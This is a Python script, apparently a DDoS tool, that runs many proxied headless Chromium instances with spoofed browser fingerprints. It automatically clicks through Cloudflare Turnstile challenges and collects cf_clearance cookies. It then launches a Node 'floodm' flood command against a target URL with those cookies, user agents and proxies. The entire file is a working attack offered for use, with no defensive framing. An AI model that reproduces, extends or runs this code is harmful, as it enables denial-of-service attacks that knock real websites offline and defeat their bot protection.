#!/usr/bin/env python3
import random
import string
import subprocess
import json
import sys
import threading
import time
import re
import os
import signal
import psutil
import concurrent.futures
from itertools import cycle
from DrissionPage import ChromiumPage, ChromiumOptions
from DrissionPage.common import Settings

Settings.set_language('en')

with open("cookie.txt", "w") as f:
    f.close()

def generate_random_string(min_length, max_length):
    characters = string.ascii_letters + string.digits
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(characters) for _ in range(length))

def generate_fingerprint():
    locatedprint = random.randint(119, 135)
    user_agents = [
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{locatedprint}.0) Gecko/20100101 Tor/{locatedprint}.0"
    ]
    chosen_ua = random.choice(user_agents)
    platforms = ["Win32", "MacIntel", "Linux x86_64"]
    chosen_platform = random.choice(platforms)
    fingerprint = {
        "User-Agent": chosen_ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.7"]),
        "Upgrade-Insecure-Requests": "1",
        "Sec-CH-UA": f'"Chromium";v="133", " Not A;Brand";v="24", "Google Chrome";v="133"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": f'"{chosen_platform}"',
        "Sec-CH-UA-Platform-Version": "10.0.0",
        "Sec-CH-UA-Arch": "x86",
        "Sec-CH-UA-Bitness": "64",
        "Sec-CH-UA-Model": "",
        "Sec-CH-UA-Full-Version": "133.0.6514.0",
    }
    return fingerprint

def generate_legitimate_headers():
    fp = generate_fingerprint()
    headers = {
        "User-Agent": fp["User-Agent"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": fp["Accept-Language"],
        "Accept-Encoding": fp["Accept-Encoding"],
        "Upgrade-Insecure-Requests": fp["Upgrade-Insecure-Requests"],
        "Sec-CH-UA": fp.get("Sec-CH-UA", ""),
        "Sec-CH-UA-Mobile": fp.get("Sec-CH-UA-Mobile", ""),
        "Sec-CH-UA-Platform": fp.get("Sec-CH-UA-Platform", ""),
        "Cache-Control": "max-age=0",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1"
    }
    return headers

def fast_click(element, times=5, delay=0.05):
    for _ in range(times):
        try:
            element.click()
        except Exception as e:
            error_msg = str(e).lower()
            if ("element object is invalid" in error_msg or "connection to the page has been disconnected" in error_msg):
                break
        time.sleep(delay)

def apply_realistic_fingerprint(driver, fingerprint):
    print("[INFO] Spoofing fingerprint for Chrome use")
    script = """
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    
    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
    
    Object.defineProperty(navigator, 'plugins', {
        get: () => [ { name: "Chrome PDF Plugin" },
                     { name: "Chrome PDF Viewer" },
                     { name: "Native Client" } ]
    });
    
    Object.defineProperty(navigator, 'platform', { get: () => arguments[0] });
    Object.defineProperty(navigator, 'vendor', { get: () => 'Google Inc.' });
    Object.defineProperty(navigator, 'product', { get: () => 'Gecko' });
    
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 4 });
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 0 });
    
    if (!window.chrome) {
        window.chrome = {
            runtime: {},
            app: { isInstalled: false },
            webstore: { onInstallStageChanged: null, onDownloadProgress: null },
            csi: function() {},
            loadTimes: function() { return { firstPaintAfterLoadTime: Date.now() / 1000 }; }
        };
    }
    
    if (window.chrome && window.chrome.runtime) {
        delete window.chrome.runtime;
    }
    
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications' ?
        Promise.resolve({ state: Notification.permission }) :
        originalQuery(parameters)
    );
    
    // Spoof canvas fingerprint
    const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
    HTMLCanvasElement.prototype.toDataURL = function() {
        return "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==";
    };
    
    // Spoof WebGL fingerprint
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function(parameter) {
      if (parameter === this.VENDOR) {
        return 'Google Inc.';
      }
      if (parameter === this.RENDERER) {
        return 'ANGLE (Intel(R) HD Graphics 520 Direct3D11 vs_5_0)';
      }
      if (parameter === this.VERSION) {
        return 'WebGL 1.0 (OpenGL ES 2.0 Chromium)';
      }
      return getParameter.call(this, parameter);
    };
    """
    try:
        driver.run_js(script, fingerprint["Sec-CH-UA-Platform"].strip('"'))
    except Exception as e:
        print(f"[WARNING] Failed to apply realistic fingerprint script: {e}")

validkey = generate_random_string(5, 10)
assigned_ports = set()
used_proxies = set()
subprocess_run_counter = 0
counter_lock = threading.Lock()
drivers = []
shutdown_event = threading.Event()
total_solved = 0
turnstileResponse = None

def kill_port(port):
    try:
        for proc in psutil.process_iter(attrs=['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] and ('chrome' in proc.info['name'].lower() or 'chromium' in proc.info['name'].lower()):
                    cmdline = proc.info.get('cmdline', [])
                    if cmdline and any(f'--remote-debugging-port={port}' in arg for arg in cmdline):
                        print(f"[INFO] Killing Chrome/Chromium process (PID: {proc.info['pid']}) using port {port}")
                        os.kill(proc.info['pid'], signal.SIGKILL)
            except psutil.NoSuchProcess:
                pass
            except Exception:
                pass
    except Exception:
        pass

def debug_bounding_box(element, name="Element"):
    if not element:
        print(f"[DEBUG] {name} is None, cannot get bounding box.")
        return None
    bbox = element.run_js("""
        if (typeof this.getBoundingClientRect === 'function') {
            var r = this.getBoundingClientRect();
            return { x: r.x, y: r.y, width: r.width, height: r.height };
        } else {
            return { x: 0, y: 0, width: 0, height: 0 };
        }
    """)
    print(f"[DEBUG] Bounding box of {name}: {bbox}")
    return bbox

def setup_driver(proxy_add, port):
    kill_port(port)
    args = [
        '--headless=new',
        '--no-sandbox',
        '--disable-field-trial-config',
        '--disable-background-networking',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-back-forward-cache',
        '--disable-breakpad',
        '--disable-application-cache',
        '--disable-client-side-phishing-detection',
        '--disable-component-extensions-with-background-pages',
        '--disable-default-apps',
        '--disable-dev-shm-usage',
        '--disable-extensions',
        '--disable-features=ImprovedCookieControls,LazyFrameLoading,GlobalMediaControls,DestroyProfileOnBrowserClose,MediaRouter,DialMediaRouteProvider,AcceptCHFrame,AutoExpandDetailsElement,CertificateTransparencyComponentUpdater,AvoidUnnecessaryBeforeUnloadCheckSync,Translate,HttpsUpgrades,PaintHolding,SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure',
        '--allow-pre-commit-input',
        '--disable-ipc-flooding-protection',
        '--disable-popup-blocking',
        '--disable-prompt-on-repost',
        '--disable-renderer-backgrounding',
        '--force-color-profile=srgb',
        '--metrics-recording-only',
        '--use-mock-keychain',
        '--no-service-autorun',
        '--export-tagged-pdf',
        '--disable-search-engine-choice-screen',
        '--flag-switches-begin',
        '--enable-quic',
        '--enable-features=PostQuantumKyber',
        '--flag-switches-end',
        '--ignore-certificate-errors',
        '--ignore-ssl-errors',
        '--tls-min-version=1.2',
        '--tls-max-version=1.3',
        '--ssl-version-min=tls1.2',
        '--ssl-version-max=tls1.3',
        '--disable-blink-features=AutomationControlled',
        '--disable-infobars',
        '--disable-features=IsolateOrigins,site-per-process'
    ]
    window_sizes = [(1366, 768), (1440, 900), (1920, 1080), (1280, 800)]
    width, height = random.choice(window_sizes)
    args.append(f'--window-size={width},{height}')
    
    co = ChromiumOptions()
    co.auto_port(True)
    for arg in args:
        co.set_argument(arg)
    
    fingerprint = generate_fingerprint()
    user_agent = fingerprint["User-Agent"]
    co.set_user_agent(user_agent)
    
    headers = generate_legitimate_headers()
    
    def configure_proxy(proxy):
        pattern = r'^(?:(?P<scheme>https?://|socks4://|socks5://))?(?:(?P<username>[^:@]+):(?P<password>[^@]+)@)?(?P<ip>[^:]+):(?P<port>\d+)$'
        m = re.match(pattern, proxy)
        if not m:
            raise ValueError("Proxy string not correct")
        scheme = m.group('scheme') if m.group('scheme') else 'http://'
        username = m.group('username')
        password = m.group('password')
        ip = m.group('ip')
        port = m.group('port')
        if username and password:
            return f'{scheme}{username}:{password}@{ip}:{port}'
        else:
            return f'{scheme}{ip}:{port}'

    co.set_browser_path('./ungoogled-chromium_131.0.6778.85-1.AppImage')
    co.set_proxy(proxy=configure_proxy(proxy_add))
    co.incognito(True)
    
    driver = ChromiumPage(addr_or_opts=co)
    
    try:
        driver.set_headers(headers)
    except AttributeError:
        pass
    except Exception as e:
        print(f"[WARNING] Failed to set extra headers: {e}")
    
    apply_realistic_fingerprint(driver, fingerprint)
    
    return driver, user_agent

def sanitize_optional_args(optional_args):
    sanitized = []
    skip_next = False
    for i in range(len(optional_args)):
        if skip_next:
            skip_next = False
            continue
        if optional_args[i].startswith('--') and i + 1 < len(optional_args):
            if optional_args[i + 1]:
                sanitized.append(optional_args[i])
                sanitized.append(optional_args[i + 1])
            skip_next = True
        elif optional_args[i].startswith('--'):
            sanitized.append(optional_args[i])
    return sanitized

def wait_for_cloudflare_cookie(page, max_timeout=15):
    start = time.time()
    while time.time() - start < max_timeout:
        cookies = page.cookies()
        if cookies:
            cookie_string = "; ".join(f"{cookie['name']}={cookie['value']}" for cookie in cookies)
            if any(len(cookie['value'].strip()) > 10 and 'cf_clearance' in cookie['name'] for cookie in cookies):
                return cookie_string
        time.sleep(0.1)
    return None

def solve(proxy_add, url, duration, rate, port, optional_args):
    global total_solved
    driver, user_agent = setup_driver(proxy_add, port)
    start_time = time.time()
    global assigned_ports

    FAIL_BYPASS = False
    clicked_success = False

    with counter_lock:
        drivers.append(driver)

    try:
        driver.get(url, timeout=15, retry=2, show_errmsg=True)
        print(f"[INFO] Proxy {proxy_add} connected. Waiting for the page to fully load")
        time_to_wait = random.randint(5, 9)
        time.sleep(time_to_wait)
        print("[INFO] WAIT FOR PAGE")

        if 'Attention Required! | Cloudflare' in driver.title:
            print("[INFO] Blocked by Cloudflare. Exiting.")
            FAIL_BYPASS = True
        if 'challenges.cloudflare.com' in driver.html:
            print(f"[INFO] Cloudflare challenge detected")
            print(f"[INFO] RUNNING PROXY: {proxy_add}")
            print(f"[INFO] Proxy: {proxy_add} attempting to solve challenge...")
            captchasolve = False
            max_tries = 40
            tries = 0
            while not captchasolve and tries < max_tries:
                tries += 1
                time.sleep(0.5)
                bounding_box = driver.run_js("""
                    var el = document.querySelector('body > div.main-wrapper > div > div > div > div');
                    if (el) {
                        var rect = el.getBoundingClientRect();
                        return {x: rect.x, y: rect.y, width: rect.width, height: rect.height};
                    }
                    return null;
                """)
                print("[DEBUG] Bounding box:", bounding_box)
                if bounding_box and bounding_box.get("width", 0) > 0 and bounding_box.get("height", 0) > 0:
                    try:
                        turnstileResponse = driver.run_js("try { return turnstile.getResponse() } catch(e) { return null }")
                        if turnstileResponse:
                            print("[DEBUG] turnstile.getResponse() returned:", turnstileResponse)
                            return turnstileResponse
                        def find_element_with_alternatives(parent, selectors, timeout=10):
                            start_t = time.time()
                            found_element = None
                            while time.time() - start_t < timeout:
                                for sel in selectors:
                                    element = parent.ele(sel)
                                    if element:
                                        print(f"[DEBUG] Found element using selector: {sel}")
                                        debug_bounding_box(element, name=f"Element: {sel}")
                                        found_element = element
                                        break
                                if found_element:
                                    return found_element
                                time.sleep(0.5)
                            return None
                        customCaptchaSelectors = [
                            "#custom-turnstile",
                            "div.custom-turnstile",
                            "input[name='custom-turnstile-response']"
                        ]
                        customCaptcha = find_element_with_alternatives(driver, customCaptchaSelectors, timeout=5)
                        if customCaptcha:
                            print("[DEBUG] Found Custom Page Turnstile captcha element.")
                            debug_bounding_box(customCaptcha, name="Custom Turnstile Captcha")
                            fast_click(customCaptcha, times=5, delay=0.05)
                        challengeSolution_selectors = [
                            "@name=cf-turnstile-response",
                            "input[name='cf-turnstile-response']",
                            "div.cf-turnstile",
                            "#cf-turnstile",
                            "[data-cf-turnstile]",
                            "input[aria-label='Turnstile challenge']",
                            ".cf-turnstile-input",
                            "cf-turnstile-response"
                        ]
                        challengeSolution = find_element_with_alternatives(driver, challengeSolution_selectors, timeout=5)
                        if not challengeSolution:
                            raise Exception("Could not find challengeSolution element")
                        challengeWrapper = challengeSolution.parent()
                        challengeIframe_selectors = [
                            "tag:iframe",
                            "iframe",
                            "div > iframe",
                            "iframe.cf-challenge",
                            "iframe[title*='challenge']",
                            ".cf-iframe"
                        ]
                        challengeIframe = find_element_with_alternatives(challengeWrapper.shadow_root, challengeIframe_selectors, timeout=5)
                        if not challengeIframe:
                            raise Exception("Could not find challengeIframe element")
                        bodyContainer_selectors = [
                            "tag:body",
                            "body",
                            "html > body",
                            "div > body",
                            ".cf-body-container"
                        ]
                        bodyContainer = find_element_with_alternatives(challengeIframe, bodyContainer_selectors, timeout=5)
                        if not bodyContainer:
                            raise Exception("Could not find body container in challengeIframe")
                        challengeIframeBody = bodyContainer.shadow_root
                        challengeButton_selectors = [
                            "tag:input",
                            "input[name='cf-turnstile-response']",
                            "button",
                            ".turnstile-button",
                            "#turnstile-button",
                            "div > input",
                            "div > button",
                            "button.turnstile__button",
                            "input.turnstile__input",
                            "[data-action='solve-turnstile']"
                        ]
                        challengeButton = find_element_with_alternatives(challengeIframeBody, challengeButton_selectors, timeout=5)
                        if not challengeButton:
                            raise Exception("Could not find challengeButton element")
                        fast_click(challengeButton, times=5, delay=0.05)
                        print("[DEBUG] Challenge button clicked rapidly.")
                        if 'cloudflare.challenges.com' in driver.html:
                            print("[DEBUG] Challenge not resolved, will retry...")
                            captchasolve = False
                        else:
                            captchasolve = True
                    except Exception as e:
                        FAIL_BYPASS = True
                        print(f"[DEBUG] Exception in challenge solve: {e}")
                        break
                else:
                    print("[DEBUG] Bounding box not available yet, waiting more...")
                if captchasolve:
                    break
            if captchasolve:
                cookies = wait_for_cloudflare_cookie(driver, max_timeout=15)
                if cookies:
                    referer_header = driver.run_js("return document.referrer;")
                    execution_time = time.time() - start_time
                    with counter_lock:
                        total_solved += 1
                    data = {
                        "page_title": driver.title,
                        "proxy_address": proxy_add,
                        "cookie_found": cookies,
                        "page_referer": referer_header,
                        "user-agent": user_agent,
                        "execution_time": execution_time,
                        "total_solved": total_solved
                    }
                    formatted_data = json.dumps(data, indent=4)
                    print(f"[SUCCESS] Proxy: {proxy_add} bypassed successfully!")
                    print(formatted_data)
                    flood_command = [
                        'node', 'floodm', url, str(duration), '35', proxy_add, str(rate),
                        cookies, user_agent, validkey
                    ]
                    sanitized_optional_args = sanitize_optional_args(optional_args)
                    flood_command.extend(sanitized_optional_args)
                    print(f"[INFO] Running flood command: {' '.join(flood_command)}")
                    subprocess.Popen(flood_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    print('-' * 100)
                    with open("cookie.txt", "a") as f:
                        f.write(f"{proxy_add}|{cookies}|{user_agent}\n")
                    return
                else:
                    print("[DEBUG] No cf_clearance cookie found after solve attempt.")
            else:
                print("[DEBUG] Captcha not solved after multiple attempts.")
    except Exception:
        pass
    finally:
        with counter_lock:
            if FAIL_BYPASS:
                print(f"[INFO] Proxy {proxy_add} - Solve failed.")
            elif clicked_success:
                print(f"[INFO] Proxy {proxy_add} - Solve successful.")
            if driver in drivers:
                drivers.remove(driver)
                if port in assigned_ports:
                    assigned_ports.remove(port)
            try:
                driver.quit()
            except Exception:
                pass

def close_all_drivers():
    with counter_lock:
        while drivers:
            driver = drivers.pop()
            try:
                driver.quit()
            except Exception:
                pass
        for port in assigned_ports:
            try:
                os.kill(port, signal.SIGKILL)
            except OSError:
                pass
        assigned_ports.clear()

def main(proxy_add, url, duration, rate, optional_args):
    global assigned_ports
    try:
        port = next(ports)
        while port in assigned_ports:
            port = next(ports)
        assigned_ports.add(port)
        solve(proxy_add, url, duration, rate, port, optional_args)
    except Exception:
        pass
    finally:
        if port in assigned_ports:
            assigned_ports.remove(port)

def signal_handler(sig, frame):
    print("[INFO] Received Ctrl+C signal. Cleaning up all processes, freeing ports, and closing sandbox...")
    close_all_drivers()
    os.system('pkill -f floodbrs')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

if __name__ == "__main__":
    if len(sys.argv) < 6:
        print("python3 e.py <target> <time> <thread_count> <rate> <proxy_file> [--query true/false --post true/false --randuser true/false]")
        sys.exit(1)
    url = sys.argv[1]
    duration = int(sys.argv[2])
    thread_count = int(sys.argv[3])
    rate = int(sys.argv[4])
    proxy_file = sys.argv[5]
    optional_args = sys.argv[6:]
    start_time = time.time()
    try:
        with open(proxy_file, "r") as f:
            proxies = f.read().splitlines()
        random.shuffle(proxies)
        ports = cycle(range(9000, 9245))
        while time.time() - start_time < duration:
            available_proxies = [proxy for proxy in proxies if proxy not in used_proxies]
            if not available_proxies:
                used_proxies.clear()
                available_proxies = proxies
                random.shuffle(available_proxies)
            with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
                futures = [
                    executor.submit(main, proxy, url, duration, rate, optional_args)
                    for proxy in available_proxies
                ]
                used_proxies.update(available_proxies)
                for future in concurrent.futures.as_completed(futures):
                    try:
                        future.result()
                    except Exception:
                        pass
    except KeyboardInterrupt:
        print("[INFO] Program interrupted by Ctrl-C. Exiting...")
        os.system('pkill -f floodbrs')
        sys.exit(0)
    except Exception:
        pass
    finally:
        close_all_drivers()
